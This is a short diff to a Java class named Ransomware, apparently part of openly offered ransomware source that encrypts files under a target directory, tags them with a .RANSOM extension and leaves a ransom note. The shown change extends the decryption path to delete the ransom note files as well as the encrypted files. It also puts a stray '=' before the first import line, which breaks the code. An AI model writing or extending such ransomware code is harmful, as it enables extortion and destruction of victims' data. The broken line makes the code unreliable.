@@ -1,4 +1,4 @@
-import java.io.BufferedWriter;
+=import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
@@ -170,7 +170,7 @@ public class Ransomware {
 		getAllFiles(TARGET_DIR, targetedFiles, false);
 		
 		decryptFiles(targetedFiles, symmetricKey);
-		deleteEncryptedFiles(targetedFiles);
+		deleteEncryptedAndRansomFiles(targetedFiles);
 	}
 
 
@@ -361,11 +361,14 @@ public class Ransomware {
 	}
 
 
-	private static void deleteEncryptedFiles(List<File> results) {
-		System.out.println("Deleting .RANSOM files.");
+	private static void deleteEncryptedAndRansomFiles(List<File> results) {
+		System.out.println("Deleting .RANSOM and ransom note files...");
 		for(File file: results) {
 			String extension = getFileExtension(file.getName());
 			if(extension.equals(EXTENSION.substring(1, EXTENSION.length()))) {
+				file.delete();
+			}
+			if(file.getName().equals(RANSOM_NAME)) {
 				file.delete();
 			}
 		}
